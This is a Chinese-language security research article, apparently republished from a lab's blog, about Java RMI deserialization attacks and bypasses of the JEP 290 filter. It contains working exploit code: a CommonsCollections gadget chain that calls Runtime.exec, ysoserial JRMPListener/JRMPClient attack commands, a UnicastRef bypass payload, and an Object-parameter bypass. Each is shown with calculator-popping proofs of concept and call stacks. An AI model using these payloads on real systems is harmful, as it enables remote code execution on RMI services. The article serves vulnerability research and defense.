**作者：天融信阿尔法实验室**  
**原文链接：<https://mp.weixin.qq.com/s/bC71HoEtDAKKbHJvStu9qA>**

# JAVA RMI反序列化知识详解

### 一、前言

在Java反序列化漏洞挖掘或利用的时候经常会遇见RMI,本文会讲述什么是RMI、RMI攻击方法、JEP290限制、绕过JEP290限制。

### 二、RMI简介

JAVA本身提供了一种RPC框架 RMI及Java 远程方法调用(Java Remote Method Invocation),可以在不同的Java
虚拟机之间进行对象间的通讯,RMI是基于JRMP协议(Java Remote Message Protocol Java远程消息交换协议)去实现的。

#### RMI调用逻辑

![](https://images.seebug.org/content/images/2020/05/4f14ac03-3aa6-4f9b-9eff-acf8551e5efb.png-w331s)

RMI主要分为三部分

  * RMI Registry注册中心
  * RMI Client 客户端
  * RMI Server服务端

### 三、RMI的实现

#### 注册中心代码

创建一个继承java.rmi.Remote的接口

    
    
    public interface HelloInterface extends java.rmi.Remote {
        public String sayHello(String from) throws java.rmi.RemoteException;
    }

创建注册中心代码

    
    
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    
    public class Registry {
        public static void main(String[] args) {
            try {
                LocateRegistry.createRegistry(1099);
            } catch (RemoteException e) {
                e.printStackTrace();
            }
            while (true) ;
        }
    }

#### 服务端代码

先创建一个继承java.rmi.Remote的接口

    
    
    public interface HelloInterface extends java.rmi.Remote {
        public String sayHello(String from) throws java.rmi.RemoteException;
    }

继承UnicastRemoteObject类,实现上面的接口

    
    
    public class HelloImpl extends UnicastRemoteObject implements HelloInterface {
        public HelloImpl() throws java.rmi.RemoteException {
            super();
        }
    
        public String sayHello(String from) throws java.rmi.RemoteException {
            System.out.println("Hello from " + from + "!!");
            return "sayHello";
        }
    }

写服务端的启动类,用于创建远程对象注册表和注册远程对象

    
    
    public class HelloServer {
        public static void main(String[] args) {
            try {
                Registry registry = LocateRegistry.getRegistry(1099);
                registry.bind("hello", new HelloImpl());
            } catch (RemoteException e) {
                e.printStackTrace();
            } catch (AlreadyBoundException e) {
                e.printStackTrace();
            }
        }
    }

#### 客户端代码

创建接口类

    
    
    public interface HelloInterface extends java.rmi.Remote {
        public String sayHello(String from) throws java.rmi.RemoteException;
    }

连接注册服务 查找hello对象

    
    
    public class HelloClient {
        public static void main(String[] args) {
            try {
                Registry registry = LocateRegistry.getRegistry(1099);
                HelloInterface hello = (HelloInterface) registry.lookup("hello");
                System.out.println(hello.sayHello("flag"));
            } catch (NotBoundException | RemoteException e) {
                e.printStackTrace();
            }
        }
    }

启动服务端之后,在启动客户端看下.

服务端输出了

![](https://images.seebug.org/content/images/2020/05/a69f841d-439f-45fd-b29f-fa8b99a37857.png-w331s)

客户端输出了

![](https://images.seebug.org/content/images/2020/05/bf40d702-f0bc-4733-bbad-e7ae5f968237.png-w331s)

### 四、攻击方法

#### 服务端攻击注册中心

从第一张图可以看到服务端也是向注册中心序列化传输远程对象,那么直接把远程对象改成反序列化Gadget看下

修改服务端代码

    
    
    public class HelloServer {
        public static void main(String[] args) throws Exception {
            try {
    
                Transformer[] transformers = new Transformer[]{
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /Applications/Calculator.app"}),
                };
                Transformer transformer = new ChainedTransformer(transformers);
                Map innerMap = new HashMap();
                Map ouputMap = LazyMap.decorate(innerMap, transformer);
    
                TiedMapEntry tiedMapEntry = new TiedMapEntry(ouputMap, "pwn");
                BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
    
                Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
                field.setAccessible(true);
                field.set(badAttributeValueExpException, tiedMapEntry);
    
                Map tmpMap = new HashMap();
                tmpMap.put("pwn", badAttributeValueExpException);
                Constructor<?> ctor = null;
                ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
                ctor.setAccessible(true);
                InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class, tmpMap);
                Remote remote = Remote.class.cast(Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]{Remote.class}, invocationHandler));
                Registry registry = LocateRegistry.getRegistry(1099);
                registry.bind("hello1", remote);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

在服务端执行这段代码 注册中心计算器会弹出,这段代码就是ysoserial工具的RMIRegistryExploit代码,debug看下注册中心执行过程

触发反序列化操作位置

`sun.rmi.registry.RegistryImpl_Skel#dispatch`

![](https://images.seebug.org/content/images/2020/05/83153b83-a5ae-4bfa-ba85-46daeae3b857.png-w331s)

调用栈

    
    
    dispatch:-1, RegistryImpl_Skel (sun.rmi.registry)
    oldDispatch:411, UnicastServerRef (sun.rmi.server)
    dispatch:272, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:568, TCPTransport (sun.rmi.transport.tcp)
    run0:826, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 736237439 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1)
    doPrivileged:-1, AccessController (java.security)
    run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
    run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:745, Thread (java.lang)

#### 注册中心攻击客户端

首先借助ysoserial项目启动一个JRMP服务端执行命令

`java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099
CommonsCollections5 "open /Applications/Calculator.app"`

然后直接启动上面客户端的代码,会发现计算器直接被弹出,debug看下客户端代码

代码位置`sun.rmi.registry.RegistryImpl_Stub#lookup`

![](https://images.seebug.org/content/images/2020/05/d2f078d6-5f2a-4046-90c1-ea57f227bfee.png-w331s)

90行调用newCall方法创建socket连接,94行序列化lookup参数,104行反序列化返回值,而此时Registry的返回值是CommonsCollections5的调用链,所以这里直接反序列化就会触发.

#### 客户端攻击注册中心

1.直接启动上面的注册中心代码

2.借助ysoserial项目JRMPClient攻击注册中心命令

`java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient
192.168.102.1 1099 CommonsCollections5 "open /Applications/Calculator.app"`

执行完命令后计算器直接弹出来了,原因是RMI框架采用DGC(Distributed Garbage
Collection)分布式垃圾收集机制来管理远程对象的生命周期,可以通过与DGC通信的方式发送恶意payload让注册中心反序列化。

debug注册中心代码看下。

`sun.rmi.transport.DGCImpl_Skel#dispatch`

![](https://images.seebug.org/content/images/2020/05/b1d779d7-d35e-4e90-b4e1-b9185afabb9d.png-w331s)

可以看到这里进行了反序列化操作。

列下调用栈

    
    
    dispatch:-1, DGCImpl_Skel (sun.rmi.transport)
    oldDispatch:411, UnicastServerRef (sun.rmi.server)
    dispatch:272, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:568, TCPTransport (sun.rmi.transport.tcp)
    run0:790, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 286880721 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1)
    doPrivileged:-1, AccessController (java.security)
    run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1142, ThreadPoolExecutor (java.util.concurrent)
    run:617, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:745, Thread (java.lang)

#### JEP290

在`JDK6u141`、`JDK7u131`、`JDK 8u121`加入了JEP 290限制,JEP 290过滤策略有

##### 进程级过滤器

可以将进程级序列化过滤器作为命令行参数`-Djdk.serialFilter
=`传递，或将其设置为`$JAVA_HOME/conf/security/java.security`中的系统属性。

##### 自定义过滤器

可以使用自定义过滤器来重写特定流的进程级过滤器

##### 内置过滤器

JDK分别为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。

这里我把jdk版本换成`jdk1.8.0_181`,默认使用内置过滤器。然后直接使用上面的服务端攻击注册中心poc看下,执行完RMI
Registry会提示这样的一个错误:

`信息: ObjectInputFilter REJECTED: class
sun.reflect.annotation.AnnotationInvocationHandler, array length: -1, nRefs:
8, depth: 2, bytes: 285, ex: n/a`

debug看下

`sun.rmi.registry.RegistryImpl#registryFilter`

    
    
    private static Status registryFilter(FilterInfo var0) {
            if (registryFilter != null) {
                Status var1 = registryFilter.checkInput(var0);
                if (var1 != Status.UNDECIDED) {
                    return var1;
                }
            }
    
            if (var0.depth() > 20L) {
                return Status.REJECTED;
            } else {
                Class var2 = var0.serialClass();
                if (var2 != null) {
                    if (!var2.isArray()) {
                        return String.class != var2 && !Number.class.isAssignableFrom(var2) && !Remote.class.isAssignableFrom(var2) && !Proxy.class.isAssignableFrom(var2) && !UnicastRef.class.isAssignableFrom(var2) && !RMIClientSocketFactory.class.isAssignableFrom(var2) && !RMIServerSocketFactory.class.isAssignableFrom(var2) && !ActivationID.class.isAssignableFrom(var2) && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
                    } else {
                        return var0.arrayLength() >= 0L && var0.arrayLength() > 1000000L ? Status.REJECTED : Status.UNDECIDED;
                    }
                } else {
                    return Status.UNDECIDED;
                }
            }
        }

白名单列表:

  * String.class
  * Number.class
  * Remote.class
  * Proxy.class
  * UnicastRef.class
  * RMIClientSocketFactory.class
  * RMIServerSocketFactory.class
  * ActivationID.class
  * UID.class

调用栈

    
    
    registryFilter:427, RegistryImpl (sun.rmi.registry)
    checkInput:-1, 2059904228 (sun.rmi.registry.RegistryImpl$$Lambda$2)
    filterCheck:1239, ObjectInputStream (java.io)
    readProxyDesc:1813, ObjectInputStream (java.io)
    readClassDesc:1748, ObjectInputStream (java.io)
    readOrdinaryObject:2042, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    readObject:431, ObjectInputStream (java.io)
    dispatch:76, RegistryImpl_Skel (sun.rmi.registry)
    oldDispatch:468, UnicastServerRef (sun.rmi.server)
    dispatch:300, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:573, TCPTransport (sun.rmi.transport.tcp)
    run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 714624149 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
    doPrivileged:-1, AccessController (java.security)
    run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)

#### UnicastRef对象

用UnicastRef对象新建一个RMI连接绕过JEP290的限制,看下ysoserial的JRMPClient的payload

![](https://images.seebug.org/content/images/2020/05/87c38e18-7a58-404a-8465-89a0a3ef8149.png-w331s)

这几行代码会向指定的RMI
Registry发起请求,并且在白名单列表里面,在看下服务端和客户端调用LocateRegistry.getRegistry方法的代码。

代码位置`java.rmi.registry#getRegistry`

![](https://images.seebug.org/content/images/2020/05/46928546-e6c4-4a3f-92cb-0601fc9bc3e8.png-w331s)

和payload发起RMI Registry请求代码是一样的。

先用ysoserial启动RMI registry`java -cp ysoserial-0.0.6-SNAPSHOT-all.jar
ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "open
/Applications/Calculator.app"`

然后把这个payload放在服务端bind看下

    
    
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
                TCPEndpoint te = new TCPEndpoint("127.0.0.1", 1199);
                UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
                RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
                Registry proxy = (Registry) Proxy.newProxyInstance(HelloServer.class.getClassLoader(), new Class[]{
                        Registry.class
                }, obj);
                registry.bind("hello", proxy);

在服务端执行RMI registry的计算器就弹出来了,debug RMI registry代码看下.

调用栈

    
    
    read:291, LiveRef (sun.rmi.transport)
    readExternal:489, UnicastRef (sun.rmi.server)
    readObject:455, RemoteObject (java.rmi.server)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    invokeReadObject:1170, ObjectStreamClass (java.io)
    readSerialData:2178, ObjectInputStream (java.io)
    readOrdinaryObject:2069, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    defaultReadFields:2287, ObjectInputStream (java.io)
    readSerialData:2211, ObjectInputStream (java.io)
    readOrdinaryObject:2069, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    readObject:431, ObjectInputStream (java.io)
    dispatch:76, RegistryImpl_Skel (sun.rmi.registry)
    oldDispatch:468, UnicastServerRef (sun.rmi.server)
    dispatch:300, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:573, TCPTransport (sun.rmi.transport.tcp)
    run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 168016515 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
    doPrivileged:-1, AccessController (java.security)
    run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)

原理就是利用在白名单的UnicastRef类来发起一个RMI连接,在高版本jdk下ysoserial的JRMPListener依然可以利用.

#### 用Object绕JEP290限制

JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器,在RMI客户端和服务端在通信时参数传递这块是没有做处理的,而参数传递也是基于序列化数据传输,那么如果参数是泛型的payload,传输依然会有问题。

先把接口都新增一个sayPayload的方法,参数都是Object类型的

    
    
    import java.rmi.Remote;
    
    public interface HelloInterface extends java.rmi.Remote {
        public String sayHello(String from) throws java.rmi.RemoteException;
        public Object sayPayload(Object from) throws java.rmi.RemoteException;
    }

在把服务端HelloImpl代码改下,去实现这个方法。

    
    
    import java.rmi.server.UnicastRemoteObject;
    
    public class HelloImpl extends UnicastRemoteObject implements HelloInterface {
        public HelloImpl() throws java.rmi.RemoteException {
            super();
        }
    
        public String sayHello(String from) throws java.rmi.RemoteException {
            System.out.println("Hello from " + from + "!!");
            return "sayHello";
        }
    
        public Object sayPayload(Object from) throws java.rmi.RemoteException {
            System.out.println("Hello from " + from + "!!");
            return null;
        }
    }

客户端在调用这个sayPayload方法时直接传payload看下

    
    
    public class HelloClient {
        public static void main(String[] args) {
            try {
                Registry registry = LocateRegistry.getRegistry(1099);
                HelloInterface hello = (HelloInterface) registry.lookup("hello1");
    
                Transformer[] transformers = new Transformer[]{
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod",
                                new Class[]{String.class, Class[].class},
                                new Object[]{"getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke",
                                new Class[]{Object.class, Object[].class},
                                new Object[]{null, new Object[0]}),
                        new InvokerTransformer("exec",
                                new Class[]{String.class},
                                new Object[]{"open /Applications/Calculator.app"})
                };
                Transformer transformerChain = new ChainedTransformer(transformers);
                Map innerMap = new HashMap();
                Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
                TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
                BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
                Field valfield = poc.getClass().getDeclaredField("val");
                valfield.setAccessible(true);
                valfield.set(poc, entry);
    
                hello.sayPayload(poc);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

执行后服务端计算器直接弹出,如果把这个payload作为sayPayload方法的返回值 客户端计算器也会弹出。

看下反序列化的地方

`sun.rmi.server.UnicastRef#marshalValue`

![](https://images.seebug.org/content/images/2020/05/851c82fc-906a-4df3-933d-96c14d0f43b3.png-w331s)

调用栈

    
    
    marshalValue:290, UnicastRef (sun.rmi.server)
    dispatch:367, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:573, TCPTransport (sun.rmi.transport.tcp)
    run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 316535884 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
    doPrivileged:-1, AccessController (java.security)
    run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)

在实际使用场景很少有参数是Object类型的,而攻击者可以完全操作客户端,因此可以用恶意对象替换从Object类派生的参数(例如String),具体有如下四种bypass的思路

  * 将java.rmi包的代码复制到新包，并在新包中修改相应的代码
  * 将调试器附加到正在运行的客户端，并在序列化之前替换这些对象
  * 使用诸如Javassist这样的工具修改字节码
  * 通过实现代理替换网络流上已经序列化的对象

我这里使用第三个方法,由afanti师傅实现的通过RASP
hook住`java.rmi.server.RemoteObjectInvocationHandler`类的InvokeRemoteMethod方法的第三个参数非Object的改为Object的gadget。不熟悉RASP的先要去了解下。

我这里使用CommonsCollections5这条链,Hook invokeRemoteMethod函数。

![](https://images.seebug.org/content/images/2020/05/6a52c191-982e-4c42-b134-049d076f3c40.png-w331s)

客户端代码还是不变

    
    
    public class Client {
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
            HelloInterface hello = ( HelloInterface ) registry.lookup("hello1");
            hello.sayHello("xxx");
        }
    }

VM options参数填写rasp jar对应的地址

![](https://images.seebug.org/content/images/2020/05/f2593403-fbc3-4791-b626-d1b311bc1a19.png-w331s)

然后直接运行

![](https://images.seebug.org/content/images/2020/05/5d6680a1-e167-4327-9a7a-247f43437a7f.png-w331s)

控制台会抛出一个错误 随后计算器也直接弹出来了.

debug看下可以看到

`java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod`这里args参数的值已经修改为CommonsCollections5的gadget了.

![](https://images.seebug.org/content/images/2020/05/93446b71-a098-4ad8-be9e-a5f7bfd9e5f1.png-w331s)

### 五、总结

RMI数据传输都是基于序列化数据传输,RMI Registry、Client、Server都能相互攻击,在你攻击别人的时候 可能也会被人攻击。

### 参考链接

  1. <https://www.anquanke.com/post/id/200860#h2-3>
  2. <https://xz.aliyun.com/t/7264#toc-2](https://xz.aliyun.com/t/7264#toc-2)>
  3. <https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/>
  4. <https://kingx.me/Exploit-Java-Deserialization-with-RMI.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1194/>

